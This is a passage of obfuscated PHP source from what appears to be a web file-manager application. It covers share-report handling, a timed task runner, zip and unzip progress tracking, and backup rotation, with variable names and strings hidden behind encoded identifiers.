$›ú…ºÇª[2026], $›ú…ºÇª[2027]))) { $êòµ”ÏÇ[$›ú…ºÇª[33]] = $á‰ÑÍÍƒ[$›ú…ºÇª[33]]; } if (isset($á‰ÑÍÍƒ[$›ú…ºÇª[770]]) && in_array($á‰ÑÍÍƒ[$›ú…ºÇª[770]], array($›ú…ºÇª[198], $›ú…ºÇª[88], $›ú…ºÇª[475], $›ú…ºÇª[2025]))) { $êòµ”ÏÇ[$›ú…ºÇª[770]] = $á‰ÑÍÍƒ[$›ú…ºÇª[770]]; } $±¢ñ†‡¿ = Input::get($›ú…ºÇª[496], $›ú…ºÇª[7], $›ú…ºÇª[2024], array($›ú…ºÇª[1942], $›ú…ºÇª[490])); $»ÂŞïÆœ = array($›ú…ºÇª[488] => $›ú…ºÇª[489], $›ú…ºÇª[490] => $›ú…ºÇª[491]); $õÊ›¨¦€ = $›ú…ºÇª[2028] . $»ÂŞïÆœ[$±¢ñ†‡¿]; $¿„”éØ£ = Model($›ú…ºÇª[2020])->where($êòµ”ÏÇ)->order($õÊ›¨¦€)->selectPage(20); if (empty($¿„”éØ£[$›ú…ºÇª[398]])) { return array(); } $Ãæ‚ÁôĞ = array_to_keyvalue_group($¿„”éØ£[$›ú…ºÇª[398]], $›ú…ºÇª[770], $›ú…ºÇª[631]); if (!empty($Ãæ‚ÁôĞ[0])) { $á‰ÑÍÍƒ = $Ãæ‚ÁôĞ[0]; $êòµ”ÏÇ = array($›ú…ºÇª[631] => array($›ú…ºÇª[7], $á‰ÑÍÍƒ)); $»ËƒÁ» = $this->where($êòµ”ÏÇ)->field($›ú…ºÇª[631])->select(); $»ËƒÁ» = array_to_keyvalue($»ËƒÁ», $›ú…ºÇª[12], $›ú…ºÇª[631]); $Š¥ÒÕÃ = array_diff($á‰ÑÍÍƒ, $»ËƒÁ»); if (!empty($Š¥ÒÕÃ)) { foreach ($¿„”éØ£[$›ú…ºÇª[398]] as $×¡Êê => $„ÔÊª¤Ö) { if (in_array($„ÔÊª¤Ö[$›ú…ºÇª[631]], $Š¥ÒÕÃ)) { unset($¿„”éØ£[$›ú…ºÇª[398]][$×¡Êê]); } } } } $this->_listDataApply($¿„”éØ£[$›ú…ºÇª[398]]); return $¿„”éØ£; } public function reportStatus($¢›Í£™Õ) { $©¤…Ÿ­· =& $_SERVER[¡“ËÌ§œ]; $æ¯î®åÀ = array($©¤…Ÿ­·[437] => $¢›Í£™Õ[$©¤…Ÿ­·[437]]); $‚¦Öû¥ò = Model($©¤…Ÿ­·[2020])->where($æ¯î®åÀ)->field($©¤…Ÿ­·[2029])->find(); if (!$‚¦Öû¥ò) { return !1; } $ô¡û– = array($©¤…Ÿ­·[770] => $¢›Í£™Õ[$©¤…Ÿ­·[770]]); if ($¢›Í£™Õ[$©¤…Ÿ­·[770]] == $©¤…Ÿ­·[2025] && $‚¦Öû¥ò[$©¤…Ÿ­·[770]] == $©¤…Ÿ­·[2025]) { $ô¡û–[$©¤…Ÿ­·[770]] = 0; } $îî×Ñ°å = Model($©¤…Ÿ­·[2020])->where($æ¯î®åÀ)->save($ô¡û–); if ($¢›Í£™Õ[$©¤…Ÿ­·[770]] == $©¤…Ÿ­·[475]) { if ($‚¦Öû¥ò[$©¤…Ÿ­·[506]] != $©¤…Ÿ­·[198] && $this->shareFileMeta($‚¦Öû¥ò[$©¤…Ÿ­·[506]])) { $this->shareFileMeta($‚¦Öû¥ò[$©¤…Ÿ­·[506]], 0); } $this->remove($‚¦Öû¥ò[$©¤…Ÿ­·[631]]); return !0; } if ($îî×Ñ°å && $¢›Í£™Õ[$©¤…Ÿ­·[770]] == $©¤…Ÿ­·[2025]) { $ÛÃ¸­æ = $ô¡û–[$©¤…Ÿ­·[770]] == $©¤…Ÿ­·[2025] ? 1 : 0; $this->shareFileMeta($‚¦Öû¥ò[$©¤…Ÿ­·[506]], $ÛÃ¸­æ); $this->removeByFile($‚¦Öû¥ò[$©¤…Ÿ­·[506]]); } return $îî×Ñ°å; } private function removeByFile($³á‰è) { $´Ÿ¯ÖØ =& $_SERVER[¡“ËÌ§œ]; $®á°ÍÎæ = Model($´Ÿ¯ÖØ[845])->where(array($´Ÿ¯ÖØ[506] => $³á‰è))->field($´Ÿ¯ÖØ[440])->select(); $‘è¶™öƒ = array_to_keyvalue($®á°ÍÎæ, $´Ÿ¯ÖØ[12], $´Ÿ¯ÖØ[440]); $ƒ¼€Àó = array($´Ÿ¯ÖØ[440] => array($´Ÿ¯ÖØ[7], $‘è¶™öƒ), $´Ÿ¯ÖØ[526] => 1); $®á°ÍÎæ = $this->where($ƒ¼€Àó)->field($´Ÿ¯ÖØ[631])->select(); if (empty($®á°ÍÎæ)) { return; } $„Èö¬“ = array_to_keyvalue($®á°ÍÎæ, $´Ÿ¯ÖØ[12], $´Ÿ¯ÖØ[631]); $this->remove($„Èö¬“); } private function shareFileMeta($ŠæÕºšö, $ÃäÔ©¦ = null) { $ÙÜÆØÑ =& $_SERVER[¡“ËÌ§œ]; $…°àíò = array($ÙÜÆØÑ[506] => $ŠæÕºšö, $ÙÜÆØÑ[94] => $ÙÜÆØÑ[2030]); if (is_null($ÃäÔ©¦)) { return Model($ÙÜÆØÑ[2031])->where($…°àíò)->find(); } $…°àíò[$ÙÜÆØÑ[403]] = $ÃäÔ©¦; Model($ÙÜÆØÑ[2031])->add($…°àíò, array(), !0); } } goto c†ÊÉŒ‹é; dÓó‹ÒÈòŒ: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ç”Œ¨¶õ, $†®…•ô = 5.0) { if (!$ç”Œ¨¶õ) { return; } $Àİµô = Cache::get($ç”Œ¨¶õ); if (!$Àİµô || timeFloat() - floatVal($Àİµô) >= $†®…•ô) { Cache::set($ç”Œ¨¶õ, timeFloat(), $†®…•ô * 10); return !0; } return !1; } public static function timeLimitCall($îåè­çæ, $Ùô°¾»…, $“Ğ¬°ÌÅ, $Äôä£ó = 5.0) { $É×š–á” =& $_SERVER[¡“ËÌ§œ]; if (!$îåè­çæ || !$Ùô°¾»…) { return; } self::$asyncAdd = !0; $¶ªœà¶ô = $É×š–á”[1765]; $¢¼İçƒ· = Cache::get($¶ªœà¶ô, !0); $ƒ†´é´ó = array($É×š–á”[1766] => timeFloat(), $É×š–á”[1767] => timeFloat(), $É×š–á”[293] => $Ùô°¾»…, $É×š–á”[1759] => $“Ğ¬°ÌÅ, $É×š–á”[180] => $Äôä£ó); if (is_array($¢¼İçƒ·[$îåè­çæ])) { $ƒ†´é´ó[$É×š–á”[1767]] = $¢¼İçƒ·[$îåè­çæ][$É×š–á”[1767]]; } if (is_array($¢¼İçƒ·[$îåè­çæ])) { if (timeFloat() - $¢¼İçƒ·[$îåè­çæ][$É×š–á”[1766]] < $ƒ†´é´ó[$É×š–á”[180]] * 0.3) { return; } $ƒ†´é´ó[$É×š–á”[1767]] = $¢¼İçƒ·[$îåè­çæ][$É×š–á”[1767]]; } $¢¼İçƒ·[$îåè­çæ] = $ƒ†´é´ó; Cache::set($¶ªœà¶ô, $¢¼İçƒ·, 60); Cache::removeMemory($¶ªœà¶ô); write_log($É×š–á”[1768] . $îåè­çæ . $É×š–á”[71] . $Ùô°¾»…, $É×š–á”[1761]); } public static function timeLimitCallLoop() { $ Ä£®Ÿ =& $_SERVER[¡“ËÌ§œ]; $í¨ûğ = array($ Ä£®Ÿ[1769]); $ê¸ôÜŠÇ = in_array(strtolower(ACTION), $í¨ûğ); if (!$ê¸ôÜŠÇ && !self::$asyncAdd) { return; } $šëÀ…ö½ = $ Ä£®Ÿ[1765]; $îø°Ü± = Cache::get($šëÀ…ö½, !0); if (!$îø°Ü± || count($îø°Ü±) <= 0) { return; } $ëÏ­–Ìû = !1; $¦ôÛï­¾ = timeFloat(); $ãç±ò­ñ = array(); foreach ($îø°Ü± as $œâ™¡À => $Õšşó) { if ($¦ôÛï­¾ - $Õšşó[$ Ä£®Ÿ[1767]] > $Õšşó[$ Ä£®Ÿ[180]]) { $ëÏ­–Ìû = !0; try { Hook::apply($Õšşó[$ Ä£®Ÿ[293]], $Õšşó[$ Ä£®Ÿ[1759]]); write_log($ Ä£®Ÿ[1770] . $œâ™¡À . $ Ä£®Ÿ[71] . $Õšşó[$ Ä£®Ÿ[293]] . $ Ä£®Ÿ[1771] . ACTION, $ Ä£®Ÿ[1761]); } catch (Exception $®ğ·Ùğ®) { } continue; } $ãç±ò­ñ[$œâ™¡À] = $Õšşó; } if (!$ëÏ­–Ìû) { return; } if (!$ãç±ò­ñ) { return Cache::remove($šëÀ…ö½); } Cache::set($šëÀ…ö½, $ãç±ò­ñ, 60); Cache::removeMemory($šëÀ…ö½); } public static function finished($ëğ’’ò, $Ğ¸ù‚ë) { $Ç–Œñ£– =& $_SERVER[¡“ËÌ§œ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($Ç–Œñ£–[293] => $ëğ’’ò, $Ç–Œñ£–[1759] => $Ğ¸ù‚ë); } private static function finishedRun() { $¿ÉèÇö =& $_SERVER[¡“ËÌ§œ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $¼€…¦Ù°) { try { Hook::apply($¼€…¦Ù°[$¿ÉèÇö[293]], $¼€…¦Ù°[$¿ÉèÇö[1759]]); } catch (Exception $×Ş¸İË) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $‘Ø­ËİÒ =& $_SERVER[¡“ËÌ§œ]; parent::startAfter(); Hook::bind($‘Ø­ËİÒ[1772], array($this, $‘Ø­ËİÒ[1773])); Hook::bind($‘Ø­ËİÒ[1213], array($this, $‘Ø­ËİÒ[1774])); $»º±Åù =& $this->task; $»º±Åù[$‘Ø­ËİÒ[1775]] = $‘Ø­ËİÒ[1214]; if (!$»º±Åù[$‘Ø­ËİÒ[1559]]) { $»º±Åù[$‘Ø­ËİÒ[1559]] = LNG($‘Ø­ËİÒ[1776]); } } protected function endAfter() { $ä“½ÆË— =& $_SERVER[¡“ËÌ§œ]; parent::endAfter(); Hook::unbind($ä“½ÆË—[1772], array($this, $ä“½ÆË—[1773])); Hook::unbind($ä“½ÆË—[1213], array($this, $ä“½ÆË—[1774])); } public function updateAfter() { $£Ï„ì¥¤ =& $_SERVER[¡“ËÌ§œ]; $ğó½›öÁ =& $this->task; if (!$ğó½›öÁ[$£Ï„ì¥¤[806]] || !$ğó½›öÁ[$£Ï„ì¥¤[783]]) { return; } if ($ğó½›öÁ[$£Ï„ì¥¤[1775]] == $£Ï„ì¥¤[1214]) { $Âœ‚ë•™ = 0; if ($ğó½›öÁ[$£Ï„ì¥¤[1714]]) { $Âœ‚ë•™ = $ğó½›öÁ[$£Ï„ì¥¤[1715]] / $ğó½›öÁ[$£Ï„ì¥¤[1714]]; } $ğó½›öÁ[$£Ï„ì¥¤[1663]] = $Âœ‚ë•™ * 0.3; } else { if ($ğó½›öÁ[$£Ï„ì¥¤[1775]] == $£Ï„ì¥¤[342]) { $Âœ‚ë•™ = $ğó½›öÁ[$£Ï„ì¥¤[1662]] / $ğó½›öÁ[$£Ï„ì¥¤[806]]; $ğó½›öÁ[$£Ï„ì¥¤[1663]] = 0.3 + $Âœ‚ë•™ * 0.4; } else { if ($ğó½›öÁ[$£Ï„ì¥¤[1775]] == $£Ï„ì¥¤[107]) { $¨Ôì©Ü¿ = 0; if ($ğó½›öÁ[$£Ï„ì¥¤[1716]] == $£Ï„ì¥¤[107]) { $¨Ôì©Ü¿ = $ğó½›öÁ[$£Ï„ì¥¤[1715]]; } $Âœ‚ë•™ = ($ğó½›öÁ[$£Ï„ì¥¤[1719]] + $¨Ôì©Ü¿) / $ğó½›öÁ[$£Ï„ì¥¤[783]]; $ğó½›öÁ[$£Ï„ì¥¤[1663]] = 0.3 + 0.4 + $Âœ‚ë•™ * 0.3; } } } if ($ğó½›öÁ[$£Ï„ì¥¤[1663]] > 0) { $¨§³ = timeFloat() - $ğó½›öÁ[$£Ï„ì¥¤[1665]] - $ğó½›öÁ[$£Ï„ì¥¤[1668]]; $ğó½›öÁ[$£Ï„ì¥¤[1669]] = $¨§³ * (1 - $ğó½›öÁ[$£Ï„ì¥¤[1663]]) / $ğó½›öÁ[$£Ï„ì¥¤[1663]]; } } public function addFile($‘ô«ÃÎª) { $Ó£÷ıÅÎ =& $_SERVER[¡“ËÌ§œ]; $ú–ÁìçÔ =& $this->task; $•¦ÀŠŞœ = IO::info($‘ô«ÃÎª); $ú–ÁìçÔ[$Ó£÷ıÅÎ[1712]] = $•¦ÀŠŞœ[$Ó£÷ıÅÎ[32]]; $ú–ÁìçÔ[$Ó£÷ıÅÎ[1714]] = $•¦ÀŠŞœ[$Ó£÷ıÅÎ[76]]; $ú–ÁìçÔ[$Ó£÷ıÅÎ[1715]] = 0; $ú–ÁìçÔ[$Ó£÷ıÅÎ[1084]] = $Ó£÷ıÅÎ[1735]; $ú–ÁìçÔ[$Ó£÷ıÅÎ[1716]] = $Ó£÷ıÅÎ[1214]; $ú–ÁìçÔ[$Ó£÷ıÅÎ[783]] = $•¦ÀŠŞœ[$Ó£÷ıÅÎ[76]]; $ú–ÁìçÔ[$Ó£÷ıÅÎ[806]] = 1; $â¿ü®½ = 0; $ú–ÁìçÔ[$Ó£÷ıÅÎ[1723]] = array($Ó£÷ıÅÎ[1724] => $â¿ü®½ + 1, $Ó£÷ıÅÎ[458] => $•¦ÀŠŞœ[$Ó£÷ıÅÎ[32]], $Ó£÷ıÅÎ[84] => $•¦ÀŠŞœ[$Ó£÷ıÅÎ[84]], $Ó£÷ıÅÎ[547] => $•¦ÀŠŞœ[$Ó£÷ıÅÎ[547]] ? $•¦ÀŠŞœ[$Ó£÷ıÅÎ[547]] : $•¦ÀŠŞœ[$Ó£÷ıÅÎ[84]]); $this->update(); } public function unzipAfter($ì´‡¿‰¥) { $‘·ùŸ·ø =& $_SERVER[¡“ËÌ§œ]; $×„Æ¦ÃÊ =& $this->task; $×„Æ¦ÃÊ[$‘·ùŸ·ø[1775]] = $‘·ùŸ·ø[107]; $½ëÛœ = IO::infoWithChildren($ì´‡¿‰¥); $‹±¸Õ¥¸ = 0; $×„Æ¦ÃÊ[$‘·ùŸ·ø[1723]] = array($‘·ùŸ·ø[1724] => $‹±¸Õ¥¸ + 1, $‘·ùŸ·ø[458] => $½ëÛœ[$‘·ùŸ·ø[32]], $‘·ùŸ·ø[84] => $½ëÛœ[$‘·ùŸ·ø[84]], $‘·ùŸ·ø[547] => $½ëÛœ[$‘·ùŸ·ø[547]] ? $½ëÛœ[$‘·ùŸ·ø[547]] : $½ëÛœ[$‘·ùŸ·ø[84]]); if ($½ëÛœ[$‘·ùŸ·ø[33]] == $‘·ùŸ·ø[200]) { $×„Æ¦ÃÊ[$‘·ùŸ·ø[806]] = 1; } else { $×„Æ¦ÃÊ[$‘·ùŸ·ø[806]] = $½ëÛœ[$‘·ùŸ·ø[79]][$‘·ùŸ·ø[77]]; } $×„Æ¦ÃÊ[$‘·ùŸ·ø[1084]] = $‘·ùŸ·ø[12]; $×„Æ¦ÃÊ[$‘·ùŸ·ø[1716]] = 0; $×„Æ¦ÃÊ[$‘·ùŸ·ø[1662]] = 0; $×„Æ¦ÃÊ[$‘·ùŸ·ø[1714]] = 0; $×„Æ¦ÃÊ[$‘·ùŸ·ø[1715]] = 0; $×„Æ¦ÃÊ[$‘·ùŸ·ø[1712]] = $‘·ùŸ·ø[12]; $×„Æ¦ÃÊ[$‘·ùŸ·ø[1719]] = 0; $×„Æ¦ÃÊ[$‘·ùŸ·ø[783]] = $½ëÛœ[$‘·ùŸ·ø[76]]; $this->update(); self::log($‘·ùŸ·ø[1777] . json_encode(array($×„Æ¦ÃÊ, $½ëÛœ))); } public function nameParse($˜ÇƒŠ£ò) { $»šØ÷¹ =& $_SERVER[¡“ËÌ§œ]; $ííóó´Ÿ =& $this->task; if ($ííóó´Ÿ[$»šØ÷¹[1775]] == $»šØ÷¹[1214]) { $ííóó´Ÿ[$»šØ÷¹[1775]] = $»šØ÷¹[342]; $ííóó´Ÿ[$»šØ÷¹[1719]] = 0; $ííóó´Ÿ[$»šØ÷¹[783]] = 0; } $Ó°œ±¹¹ = get_path_this($˜ÇƒŠ£ò); if (strstr($Ó°œ±¹¹, $»šØ÷¹[10])) { $ííóó´Ÿ[$»šØ÷¹[1662]] += 1; $ííóó´Ÿ[$»šØ÷¹[806]] += 1; } $ííóó´Ÿ[$»šØ÷¹[1712]] = $˜ÇƒŠ£ò; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $Âõ¢£¹‡ =& $_SERVER[¡“ËÌ§œ]; parent::startAfter(); Hook::bind($Âõ¢£¹‡[1778], array($this, $Âõ¢£¹‡[1773])); $‹‚ß½­ =& $this->task; $‹‚ß½­[$Âõ¢£¹‡[1775]] = $Âõ¢£¹‡[1214]; if (!$‹‚ß½­[$Âõ¢£¹‡[1559]]) { $‹‚ß½­[$Âõ¢£¹‡[1559]] = LNG($Âõ¢£¹‡[1779]); } } protected function endAfter() { $Ï·àã§ =& $_SERVER[¡“ËÌ§œ]; parent::endAfter(); Hook::unbind($Ï·àã§[1778], array($this, $Ï·àã§[1773])); } public function updateAfter() { $ÙŠ±ê”Ñ =& $_SERVER[¡“ËÌ§œ]; $Óá“—š± =& $this->task; if (!$Óá“—š±[$ÙŠ±ê”Ñ[806]] || !$Óá“—š±[$ÙŠ±ê”Ñ[783]]) { return; } if ($Óá“—š±[$ÙŠ±ê”Ñ[1775]] == $ÙŠ±ê”Ñ[1214]) { $§Ï§à™ = $Óá“—š±[$ÙŠ±ê”Ñ[1715]]; if ($Óá“—š±[$ÙŠ±ê”Ñ[1716]] != $ÙŠ±ê”Ñ[1214]) { $§Ï§à™ = 0; } $ƒäÈê¡¿ = ($Óá“—š±[$ÙŠ±ê”Ñ[1719]] + $§Ï§à™) / $Óá“—š±[$ÙŠ±ê”Ñ[783]]; $Óá“—š±[$ÙŠ±ê”Ñ[1663]] = $ƒäÈê¡¿ * 0.3; } else { if ($Óá“—š±[$ÙŠ±ê”Ñ[1775]] == $ÙŠ±ê”Ñ[342]) { $ƒäÈê¡¿ = $Óá“—š±[$ÙŠ±ê”Ñ[1662]] / $Óá“—š±[$ÙŠ±ê”Ñ[806]]; $Óá“—š±[$ÙŠ±ê”Ñ[1663]] = 0.3 + $ƒäÈê¡¿ * 0.5; } else { if ($Óá“—š±[$ÙŠ±ê”Ñ[1775]] == $ÙŠ±ê”Ñ[107]) { $ƒäÈê¡¿ = 0; if ($Óá“—š±[$ÙŠ±ê”Ñ[1714]]) { $ƒäÈê¡¿ = $Óá“—š±[$ÙŠ±ê”Ñ[1715]] / $Óá“—š±[$ÙŠ±ê”Ñ[1714]]; } $Óá“—š±[$ÙŠ±ê”Ñ[1663]] = 0.3 + 0.5 + $ƒäÈê¡¿ * 0.2; } } } if ($Óá“—š±[$ÙŠ±ê”Ñ[1663]] > 0) { $¸¢­íŠ³ = timeFloat() - $Óá“—š±[$ÙŠ±ê”Ñ[1665]] - $Óá“—š±[$ÙŠ±ê”Ñ[1668]]; $Óá“—š±[$ÙŠ±ê”Ñ[1669]] = $¸¢­íŠ³ * (1 - $Óá“—š±[$ÙŠ±ê”Ñ[1663]]) / $Óá“—š±[$ÙŠ±ê”Ñ[1663]]; } } public function copyFileStart($ÛœÙĞìâ, $¢î®ï‘, $–ôç‚»ë, $™˜¯›èÑ, $ğàçÆãÕ, $–‹¸£Ç) { $ææ¸Ü =& $_SERVER[¡“ËÌ§œ]; parent::copyFileStart($ÛœÙĞìâ, $¢î®ï‘, $–ôç‚»ë, $™˜¯›èÑ, $ğàçÆãÕ, $–‹¸£Ç); $ˆåÈ¬ú® =& $this->task; if ($ˆåÈ¬ú®[$ææ¸Ü[1775]] == $ææ¸Ü[342]) { $ˆåÈ¬ú®[$ææ¸Ü[1775]] = $ææ¸Ü[107]; } $this->update(); } public function copyFileEnd($ü¯•ÈÀÁ, $›€‘ÇÆ, $ÉôÔÀ¢¨, $€Ÿ®´î—, $¦áèù×, $œ®¯öÒº) { $ï®×İ­Æ =& $_SERVER[¡“ËÌ§œ]; $á¥É¡É° =& $this->task; $á¥É¡É°[$ï®×İ­Æ[1715]] = $á¥É¡É°[$ï®×İ­Æ[1714]]; $á¥É¡É°[$ï®×İ­Æ[1719]] += $á¥É¡É°[$ï®×İ­Æ[1714]]; $á¥É¡É°[$ï®×İ­Æ[1716]] = $ï®×İ­Æ[12]; $this->update(); } public function nameParse($®Öó¬ğ) { $õ¾œæÃ‹ =& $_SERVER[¡“ËÌ§œ]; $ù¸½ÎŠ =& $this->task; if ($ù¸½ÎŠ[$õ¾œæÃ‹[1662]] < $ù¸½ÎŠ[$õ¾œæÃ‹[806]]) { $’æ½µ°Š = get_path_this($®Öó¬ğ); if (strstr($’æ½µ°Š, $õ¾œæÃ‹[10])) { $ù¸½ÎŠ[$õ¾œæÃ‹[1662]] += 1; } } if ($ù¸½ÎŠ[$õ¾œæÃ‹[1775]] == $õ¾œæÃ‹[1214]) { $ù¸½ÎŠ[$õ¾œæÃ‹[1775]] = $õ¾œæÃ‹[342]; } $ù¸½ÎŠ[$õ¾œæÃ‹[1712]] = $®Öó¬ğ; $this->update(); } } goto E¡¢¨‘Ï®×; bÊÚŸ¦öç: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $ãö—Ş´Ã =& $_SERVER[¡“ËÌ§œ]; $this->isManual(); self::$name = date($ãö—Ş´Ã[768]); if (!($ã™¡˜ı = Model($ãö—Ş´Ã[769])->lastItem())) { $ã™¡˜ı = $this->initData(); } else { self::$name = $ã™¡˜ı[$ãö—Ş´Ã[32]]; if ($ã™¡˜ı[$ãö—Ş´Ã[770]] == $ãö—Ş´Ã[88]) { self::$name = date($ãö—Ş´Ã[240]); $£ÜŠÑ° = 0; if (isset($ã™¡˜ı[$ãö—Ş´Ã[322]][$ãö—Ş´Ã[200]][$ãö—Ş´Ã[506]])) { $£ÜŠÑ° = (int) $ã™¡˜ı[$ãö—Ş´Ã[322]][$ãö—Ş´Ã[200]][$ãö—Ş´Ã[506]]; } if (self::$manual == 0 && $ã™¡˜ı[$ãö—Ş´Ã[32]] == self::$name) { Model($ãö—Ş´Ã[769])->remove($ã™¡˜ı[$ãö—Ş´Ã[437]]); } $ã™¡˜ı = $this->initData($£ÜŠÑ°, $ã™¡˜ı[$ãö—Ş´Ã[771]]); } else { $this->checkStore($ã™¡˜ı[$ãö—Ş´Ã[771]]); } } self::$option = $ã™¡˜ı; } private function isManual() { $×–»é¹ = _get($GLOBALS, $_SERVER[¡“ËÌ§œ][772], 0); $×–»é¹ = intval($×–»é¹); self::$manual = $×–»é¹ && $×–»é¹ == 1 ? 1 : 0; } private function initData($úÑÏç„ = 0, $›ˆ¢Í¤Ñ = '') { $şıÁ„şš =& $_SERVER[¡“ËÌ§œ]; $íşğ¬ï£ = Model($şıÁ„şš[769])->config(); if ($›ˆ¢Í¤Ñ && $íşğ¬ï£[$şıÁ„şš[771]] != $›ˆ¢Í¤Ñ) { $úÑÏç„ = 0; } $this->checkStore($íşğ¬ï£[$şıÁ„şš[771]]); if (self::$manual == 1) { self::$name .= $şıÁ„şš[11] . date($şıÁ„şš[773]); } $øñ ±‚ = array($şıÁ„şš[771] => $íşğ¬ï£[$şıÁ„şš[771]], $şıÁ„şš[32] => self::$name, $şıÁ„şš[770] => 0, $şıÁ„şš[774] => $íşğ¬ï£[$şıÁ„şš[774]], $şıÁ„şš[775] => self::$manual, $şıÁ„şš[322] => array($şıÁ„şš[776] => array($şıÁ„şš[770] => 0), $şıÁ„şš[777] => array($şıÁ„şš[770] => 0, $şıÁ„şš[778] => 0, $şıÁ„şš[779] => 0, $şıÁ„şš[33] => $şıÁ„şš[12], $şıÁ„şš[780] => 0, $şıÁ„şš[781] => 0), $şıÁ„şš[782] => array($şıÁ„şš[770] => 0, $şıÁ„şš[778] => 0, $şıÁ„şš[779] => 0, $şıÁ„şš[780] => 0, $şıÁ„şš[781] => 0), $şıÁ„şš[200] => array($şıÁ„şš[770] => 0, $şıÁ„şš[783] => 0, $şıÁ„şš[784] => 0, $şıÁ„şš[785] => 0, $şıÁ„şš[786] => 0, $şıÁ„şš[506] => $úÑÏç„, $şıÁ„şš[780] => 0, $şıÁ„şš[781] => 0)), $şıÁ„şš[780] => time(), $şıÁ„şš[781] => 0); $ã«º°ôÃ = Model($şıÁ„şš[769])->insert($øñ ±‚); $øñ ±‚[$şıÁ„şš[437]] = $ã«º°ôÃ; return $øñ ±‚; } private function checkStore($®µ»‡¡) { $Ãâ“áùË =& $_SERVER[¡“ËÌ§œ]; $Ğ â¤Ü² = Model($Ãâ“áùË[787])->listData($®µ»‡¡); Model($Ãâ“áùË[787])->checkConfig($Ğ â¤Ü²); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[¡“ËÌ§œ][769])->findByName(self::$name); } return self::$option; } public static function set($ÛİÛå¾Ø) { $Öæ‚À¦Â =& $_SERVER[¡“ËÌ§œ]; $ş¬¤¢÷à = self::get(); foreach ($ÛİÛå¾Ø as $…êÚ‘œ€ => $€œ”ÉÁ°) { $í‡õ—Œ£ = explode($Öæ‚À¦Â[10], $…êÚ‘œ€); $€íÏûÊÊ = count($í‡õ—Œ£); switch ($€íÏûÊÊ) { case 1: $ş¬¤¢÷à[$í‡õ—Œ£[0]] = $€œ”ÉÁ°; break; case 2: $ş¬¤¢÷à[$í‡õ—Œ£[0]][$í‡õ—Œ£[1]] = $€œ”ÉÁ°; break; case 3: $ş¬¤¢÷à[$í‡õ—Œ£[0]][$í‡õ—Œ£[1]][$í‡õ—Œ£[2]] = $€œ”ÉÁ°; break; } } Model($Öæ‚À¦Â[769])->update($ş¬¤¢÷à[$Öæ‚À¦Â[437]], $ş¬¤¢÷à); self::$option = $ş¬¤¢÷à; return self::$option; } public function keep() { $ÔğÒ£÷¸ =& $_SERVER[¡“ËÌ§œ]; $öì¬ÆÛƒ = self::get(); if ($öì¬ÆÛƒ[$ÔğÒ£÷¸[322]][$ÔğÒ£÷¸[776]][$ÔğÒ£÷¸[770]] == $ÔğÒ£÷¸[88]) { return; } $this->backupKeep($öì¬ÆÛƒ); self::set(array($ÔğÒ£÷¸[788] => 1)); } private function backupKeep($›˜‹¶ğß) { $•äƒ´ÂÂ =& $_SERVER[¡“ËÌ§œ]; if (self::$manual == 1) { return; } $ãú‰Â² = Model($•äƒ´ÂÂ[769])->listData(); if (empty($ãú‰Â²)) { return; } $š»Ÿˆ°Â = 0; $õİ€Ùºâ = array(); foreach ($ãú‰Â² as $¥›İ›÷á) { if ($š»Ÿˆ°Â >= 7) { break; } $õİ€Ùºâ[] = $¥›İ›÷á[$•äƒ´ÂÂ[32]]; $š»Ÿˆ°Â++; } for ($š»Ÿˆ°Â = 0; $š»Ÿˆ°Â < 12; $š»Ÿˆ°Â++) { $õİ€Ùºâ[] = date($•äƒ´ÂÂ[789], strtotime("\55{$š»Ÿˆ°Â}\40\x6d\157\x6e\x74\x68\163")); } $õİ€Ùºâ = array_unique($õİ€Ùºâ); $¯»Ş—Íå = Model($•äƒ´ÂÂ[790])->get($•äƒ´ÂÂ[791]); foreach ($ãú‰Â² as $¥›İ›÷á) { if (isset($¥›İ›÷á[$•äƒ´ÂÂ[775]]) && $¥›İ›÷á[$•äƒ´ÂÂ[775]] == $•äƒ´ÂÂ[88]) { continue; } if (!empty($¥›İ›÷á[$•äƒ´ÂÂ[32]]) && in_array($¥›İ›÷á[$•äƒ´ÂÂ[32]], $õİ€Ùºâ)) { continue; } Model($•äƒ´ÂÂ[769])->remove($¥›İ›÷á[$•äƒ´ÂÂ[437]]); $ê‹Ğ…¬® = $this->backupPath($›˜‹¶ğß, $¯»Ş—Íå); IO::remove($ê‹Ğ…¬®, !1); } } private function backupPath($âö¡ˆ, $î˜‰àÆ  = false) { $ñ‚ÏœÅ¬ =& $_SERVER[¡“ËÌ§œ]; if (!$î˜‰àÆ ) { $î˜‰àÆ  = Model($ñ‚ÏœÅ¬[790])->get($ñ‚ÏœÅ¬[791]); } $İ½…©Ø  = $âö¡ˆ[$ñ‚ÏœÅ¬[32]]; $Ñ¯³†Šú = substr(md5($ñ‚ÏœÅ¬[792] . $î˜‰àÆ  . $İ½…©Ø ), 0, 8); return "\173\x69\x6f\72{$âö¡ˆ[$ñ‚ÏœÅ¬[771]]}\175\57\144\141\164\x61\x62\141\163\x65\x2f\x62\x61\x63\x6b\x75\160\57" . $İ½…©Ø  . $ñ‚ÏœÅ¬[11] . $Ñ¯³†Šú; } public function db() { $¾ªèõÏò =& $_SERVER[¡“ËÌ§œ]; $ÖÈ€âˆ¤ = self::get(); if ($ÖÈ€âˆ¤[$¾ªèõÏò[322]][$¾ªèõÏò[777]][$¾ªèõÏò[770]] == $¾ªèõÏò[88]) { return !0; } $Èı³××ë = new BackupDb(); if (!$Èı³××ë->index()) { return !1; } self::set(array($¾ªèõÏò[793] => 1)); return !0; } public function dbFile() { $ù•Â¢©¦ =& $_SERVER[¡“ËÌ§œ]; $êúğê¡‡ = self::get(); if ($êúğê¡‡[$ù•Â¢©¦[322]][$ù•Â¢©¦[782]][$ù•Â¢©¦[770]] == $ù•Â¢©¦[88]) { return !0; } $ÓÖáÚƒ› = new BackupDbFile(); if (!$ÓÖáÚƒ›->index()) { return !1; } self::set(array($ù•Â¢©¦[794] => 1)); return !0; } public function file() { $«˜ö½×à =& $_SERVER[¡“ËÌ§œ]; $ÍÄ‚Ùø“ = self::get(); if ($ÍÄ‚Ùø“[$«˜ö½×à[322]][$«˜ö½×à[200]][$«˜ö½×à[770]] == $«˜ö½×à[88]) { return !0; } if 